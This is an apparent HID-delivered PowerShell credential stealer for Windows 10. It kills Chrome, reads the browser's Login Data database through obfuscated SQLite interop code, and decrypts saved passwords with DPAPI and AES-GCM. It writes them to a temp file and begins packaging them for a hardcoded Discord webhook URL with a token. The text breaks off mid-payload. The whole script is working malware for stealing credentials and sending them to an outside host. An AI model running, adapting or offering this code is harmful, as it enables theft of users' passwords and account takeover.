#########################################################################################################
#                                |                    #
# Title    : Browser-Passwords-Discord-Exfiltration     |  ____ _____  ______         #
# Author    : DIYS.py                      | | _ \_ _\ \ / / ___| _ __ _  _  #
# Version   : 1.0                       | | | | | | \ V /\___ \ | '_ \| | | | #
# Category   : Credentials, Exfiltration           | | |_| | | | |  ___) || |_) | |_| | #
# Target    : Windows 10                   | |____/___| |_| |____(_) .__/ \__, | #
# Mode     : HID                       |            |_|  |___/  #
# Props    : I am Jakoby, NULLSESSION0X           |                    #
#                                |                    #
#########################################################################################################

<#
.SYNOPSIS
    This script exfiltrates credentials from the browser via Discord webhook.
.DESCRIPTION 
    Checks and saves the credentials from the Chrome browser, then sends them to a specified Discord webhook URL.
.Link
    https://discord.com/developers/docs/resources/webhook    # Guide for setting up your Discord webhook
#>

$DiscordWebhookURL = "https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

# Stage 1: Obtain the credentials from the Chrome browser's User Data folder

# First, we kill Chrome just to be safe
Stop-Process -Name Chrome -Force

# Import required assemblies
$d = Add-Type -AssemblyName System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3", EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$z = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$u = [System.Security.Cryptography.ProtectedData]

# Define SQLite queries and types
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    $p class W {
        $i open$g IntPtr db, $m Str)]string f, out IntPtr p);
        $i prepare16_v2$g IntPtr db, $m WStr)]string l, int n, out IntPtr s, IntPtr t);
        $i step$g IntPtr s);
        $i column_text16$g IntPtr s, $f;
        $i column_bytes$g int Y, $f;
        $i column_blob$g IntPtr s, $f;
        $p string T$f{return Marshal.PtrToStringUni(C$q);}
        $p byte[] B$f{
            byte[] r = new byte[Y$q];
            Marshal.Copy(L$q, r, 0, Y$q);
            return r;
        }
    }
"@

# Open Chrome's Login Data SQLite database
$s = [W]::O("$z\Default\Login Data", [ref]$d)

# Initialize array for storing credentials
$l = @()

# Handle encryption key for Chrome based on OS version
if ($host.Version -like "7*") {
    $b = (Get-Content "$z\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
    $x = [System.Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.Length-1)], $null, 0))
}

# Query and decrypt credentials from SQLite database
$_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)
for (; !([W]::S($s) % 100); ) {
    $l += [W]::T($s, 0), [W]::T($s, 3)
    $c = [W]::B($s, 5)
    try {
        $e = $u::Unprotect($c, $null, 0)
    } catch {
        if ($x) {
            $k = $c.Length
            $e = [byte[]]::new($k - 31)
            $x.Decrypt($c[3..14], $c[15..($k - 17)], $c[($k - 16)..($k - 1)], $e)
        }
    }
    $l += ($e | ForEach-Object { [char]$_ }) -join ''
}

# After decrypting the contents of the files, save them to a file in the temp folder
$FileContent = $l -join "`r`n"
$FileContent | Set-Content -Path "$env:TEMP\$FileName" -Force -Encoding UTF8

# Prepare the payload for Discord
$Payload = @{
    content = "```\n$FileContent\n